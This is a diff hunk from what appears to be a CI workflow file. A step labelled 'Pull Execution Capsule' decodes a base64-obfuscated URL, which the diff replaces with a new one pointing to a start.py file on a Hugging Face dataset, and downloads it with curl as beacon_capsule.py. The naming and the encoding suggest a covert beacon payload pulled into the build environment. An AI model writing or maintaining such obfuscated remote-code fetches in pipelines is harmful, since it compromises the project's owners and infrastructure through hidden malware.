@@ -68,7 +68,7 @@ jobs:
       - name: Pull Execution Capsule
         run: |
           echo "[PULL] Pulling beacon_capsule.py from assigned relay point..."
-          RELAY_POINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          RELAY_POINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$RELAY_POINT" -o beacon_capsule.py
           echo "[PULL] Execution capsule pulled."
 
